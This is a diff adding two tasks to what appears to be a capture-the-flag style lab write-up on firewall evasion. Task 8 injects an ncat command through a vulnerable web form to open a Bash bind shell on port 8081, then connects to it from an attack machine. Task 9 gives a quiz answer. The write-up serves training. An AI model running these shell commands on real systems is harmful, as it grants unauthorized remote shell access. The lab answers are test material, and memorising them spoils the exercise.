@@ -76,3 +76,16 @@ Answer is `21`
 2. On the Attack Machine, execute `nc 10.10.175.124 8008`
 3. Perform a `GET /` request from the netcat terminal on the Attack Machine to the Target to display the flag.
 
+### Task 8
+
+> We’re continuing to use the web-form from Task 6 to set up the ncat listener. Knowing that the firewall does not block packets to destination port 8081, use ncat to listen for incoming connections and execute Bash shell. Use the AttackBox to connect to the listening shell. What is the user name associated with which you are logged in?
+
+1. On the vulnerable web form, execute `ncat -lvnp 8081 -e /bin/bash`
+2. On the Attack Machine, execute `ncat 10.10.175.124 8081`
+3. Execute `whoami` on the netcat terminal on the attack machine to get the username
+
+### Task 9
+
+> What is the number of the highest OSI layer that an NGFW can process?
+
+`7`
